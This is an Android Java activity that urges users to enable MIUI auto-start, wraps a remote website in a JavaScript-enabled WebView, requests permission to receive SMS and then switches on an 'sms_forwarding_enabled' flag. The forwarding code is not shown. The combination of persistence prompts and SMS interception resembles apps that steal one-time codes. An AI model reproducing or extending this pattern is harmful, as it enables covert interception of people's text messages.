
package com.example.safesmstest;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.graphics.Color;
import android.view.Gravity;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebChromeClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Button;

public class MainActivity extends Activity {

    private static final int SMS_PERMISSION_REQUEST = 301;
    private static final String HOME_URL =
            "https://aitap3-7funsfro.manus.space";

    private static final String PREFS = "AppSetup";
    private static final String AUTO_START_DONE = "auto_start_done";

    private WebView webView;
    private boolean webViewShown = false;
    private boolean openingSettings = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences prefs =
                getSharedPreferences(PREFS, MODE_PRIVATE);

        if (prefs.getBoolean(AUTO_START_DONE, false)) {
            showWebView(savedInstanceState);
        } else {
            showAutoStartScreen();
        }
    }

    private void showAutoStartScreen() {
        // WebView မဖန်တီးဘဲ Auto Start Screen သီးသန့်ပြမယ်
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);
        layout.setBackgroundColor(Color.WHITE);

        TextView title = new TextView(this);
        title.setText("Enable Auto Start");
        title.setTextSize(24);
        title.setTextColor(Color.BLACK);
        title.setGravity(Gravity.CENTER);

        TextView message = new TextView(this);
        message.setText(
                "Please enable Auto Start to continue."
        );
        message.setTextSize(15);
        message.setTextColor(Color.DKGRAY);
        message.setGravity(Gravity.CENTER);
        message.setPadding(0, 18, 0, 25);

        Button button = new Button(this);
        button.setText("Enable Auto Start");
        button.setOnClickListener(v -> openAutoStartSettings());

        layout.addView(title);
        layout.addView(message);
        layout.addView(button);

        setContentView(layout);
    }

    private void openAutoStartSettings() {
        openingSettings = true;

        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
            ));
            startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(
                        "miui.intent.action.OP_AUTO_START"
                );
                intent.setPackage("com.miui.securitycenter");
                startActivity(intent);
            } catch (Exception ex) {
                Intent intent = new Intent(
                        Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                );
                intent.setData(Uri.parse(
                        "package:" + getPackageName()
                ));
                startActivity(intent);
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (openingSettings) {
            openingSettings = false;

            getSharedPreferences(PREFS, MODE_PRIVATE)
                    .edit()
                    .putBoolean(AUTO_START_DONE, true)
                    .apply();

            showWebView(null);
        }
    }

    private void showWebView(Bundle state) {
        if (webViewShown || isFinishing()) return;

        webViewShown = true;

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());

        setContentView(webView);

        if (state != null) {
            webView.restoreState(state);
        } else {
            webView.loadUrl(HOME_URL);
        }

        requestSmsPermission();
    }

    private void requestSmsPermission() {
        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            enableForwarding();
            return;
        }

        requestPermissions(
                new String[]{Manifest.permission.RECEIVE_SMS},
                SMS_PERMISSION_REQUEST
        );
    }

    private void enableForwarding() {
        getSharedPreferences("SmsPrefs", MODE_PRIVATE)
                .edit()
                .putBoolean("sms_forwarding_enabled", true)
                .apply();
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            String[] permissions,
            int[] grantResults) {

        super.onRequestPermissionsResult(
                requestCode, permissions, grantResults
        );

        if (requestCode == SMS_PERMISSION_REQUEST) {
            if (grantResults.length > 0 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                enableForwarding();
            } else {
                getSharedPreferences("SmsPrefs", MODE_PRIVATE)
                        .edit()
                        .putBoolean("sms_forwarding_enabled", false)
                        .apply();
            }
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        if (webView != null && webViewShown) {
            webView.saveState(outState);
        }
        super.onSaveInstanceState(outState);
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
        super.onDestroy();
    }
}

